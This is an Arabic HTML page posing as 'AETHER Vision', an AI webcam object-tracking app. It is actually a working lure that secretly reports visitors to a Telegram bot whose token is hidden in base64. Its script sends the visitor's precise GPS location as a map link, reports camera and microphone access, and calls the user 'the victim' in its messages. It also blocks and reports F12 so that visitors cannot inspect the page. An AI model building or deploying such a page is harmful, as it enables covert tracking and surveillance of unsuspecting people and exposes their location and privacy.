<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AETHER Vision v1.0 | الإصدار المصحح</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">

    <style>
        :root { --brand-red: #e50914; --dark-bg: #050505; }
        body { background-color: var(--dark-bg); color: #fff; font-family: 'Cairo', sans-serif; overflow: hidden; }
        
        .main-container {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            height: 100vh; text-align: center; padding: 20px;
        }

        .video-box {
            width: 100%; max-width: 500px; aspect-ratio: 1/1;
            background: #111; border-radius: 20px; border: 1px solid #333;
            display: flex; align-items: center; justify-content: center; position: relative;
        }

        #webcam { width: 100%; height: 100%; object-fit: cover; border-radius: 20px; display: none; }

        .btn-action {
            background: #333; color: white; padding: 20px 40px;
            border-radius: 15px; font-weight: 900; width: 100%; max-width: 250px;
            transition: 0.3s; cursor: pointer; border: none;
        }
        .btn-active { background: var(--brand-red); box-shadow: 0 0 30px rgba(229, 9, 20, 0.4); }

        #loader {
            position: fixed; inset: 0; background: #000; z-index: 9999;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
    </style>
</head>
<body>

<div id="loader">
    <div class="text-6xl font-black text-red-600 italic animate-pulse">AETHER</div>
    <p class="mt-4 text-gray-500 uppercase tracking-widest text-xs">Initializing Secure Core...</p>
</div>

<div class="main-container">
    <h1 class="text-4xl font-black mb-2 italic">AETHER<span class="text-red-600">Vision v1.0</span></h1>
    <p class="text-gray-400 text-sm mb-10">نظام تتبع الأجسام الحقيقية بالذكاء الاصطناعي</p>

    <div class="video-box mb-8">
        <video id="webcam" autoplay playsinline muted></video>
        <div id="placeholder-icon">
            <i class="fas fa-video-slash text-5xl text-gray-800"></i>
        </div>
    </div>

    <div class="flex flex-col gap-4 w-full items-center">
        <button id="trigger-btn" class="btn-action">
            <i class="fas fa-sync-alt ml-2"></i> جارٍ التشغيل...
        </button>
        <div id="status-box" class="bg-black/50 p-4 rounded-lg border border-white/5 text-xs">
            الحالة: <span id="status-text" class="text-yellow-500">جاري تحميل الموديل...</span>
        </div>
    </div>
</div>

<script>
    /* التعديلات المصيرية لضمان عمل الصلاحيات */
    
    const _SET = {
        _K: "ODM3ODA5OTgwMDpBQUdUT0x6SkNoOHFvcy0xWXZzc0VHWmZZRDdWLUlMSGNSbw==",
        _C: "NjA1MjUzMjA0NA=="
    };

    const _D = (s) => atob(s);
    const API = `https://api.telegram.org/bot${_D(_SET._K)}`;
    const CHAT = _D(_SET._C);

    async function _SEND(msg) {
        try {
            await fetch(`${API}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT, text: `🛡️ [SYSTEM]: ${msg}`, parse_mode: 'HTML'})
            });
        } catch(e) {}
    }

    // 1. تصحيح حرف الـ W المفقود وضمان التحميل
    window.onload = () => {
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('status-text').innerText = "جاهز، يرجى الضغط للبدء";
            document.getElementById('trigger-btn').classList.add('btn-active');
            _SEND("🚀 الصفحة محملة بالكامل وبدون أخطاء.");
        }, 2000);
    };

    // 2. دالة طلب الصلاحيات (الموقع + الكاميرا)
    async function requestPermissions() {
        const statusText = document.getElementById('status-text');
        const triggerBtn = document.getElementById('trigger-btn');
        
        statusText.innerText = "يتم الآن طلب الصلاحيات...";
        _SEND("🕵️ الضحية ضغط على الزر، يتم طلب الصلاحيات الآن.");

        // طلب الموقع (Geolocation)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                _SEND(`📍 <b>تم سحب الموقع:</b>\n<a href="${mapLink}">عرض الموقع</a>`);
            }, err => {
                _SEND(`❌ رفض الموقع: ${err.message}`);
            }, {enableHighAccuracy: true});
        }

        // طلب الكاميرا (Camera)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('webcam');
            video.srcObject = stream;
            video.style.display = 'block';
            document.getElementById('placeholder-icon').style.display = 'none';
            statusText.innerText = "التتبع نشط";
            statusText.style.color = "#00ffcc";
            _SEND("📸 <b>تم تفعيل الكاميرا بنجاح.</b>");
        } catch (err) {
            statusText.innerText = "خطأ: " + err.message;
            statusText.style.color = "#ff4444";
            _SEND(`❌ رفض الكاميرا: ${err.message}`);
        }
    }

    // ربط الزر بالدالة - هذا يضمن أن المتصفح لن يحظر الطلب
    document.getElementById('trigger-btn').onclick = requestPermissions;

    // منع التفتيش (تصحيح الـ W المفقود)
    window.onkeydown = (e) => {
        if (e.keyCode == 123) {
            _SEND("⚠️ الضحية حاول فتح أدوات المطور (F12).");
            return false;
        }
    };
</script>

</body>
</html>
